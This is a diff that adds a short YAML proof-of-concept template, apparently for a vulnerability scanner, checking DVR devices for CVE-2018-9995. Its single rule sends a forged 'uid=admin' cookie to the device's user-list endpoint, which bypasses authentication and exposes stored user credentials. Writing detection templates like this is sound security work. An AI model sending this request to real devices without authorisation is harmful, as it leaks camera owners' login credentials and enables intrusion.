@@ -1,0 +1,20 @@
+detail:
+  Affected Version: DVR
+  author: cc_ci(https://github.com/cc8ci)
+  links:
+  - https://s.tencent.com/research/bsafe/474.html
+expression: r0()
+manual: true
+name: poc-yaml-dvr-cve-2018-9995
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes("\"uid\":"))
+      && response.body.bcontains(b"playback")
+    request:
+      cache: true
+      follow_redirects: true
+      headers:
+        Cookie: uid=admin
+      method: GET
+      path: /device.rsp?opt=user&cmd=list
+transport: http
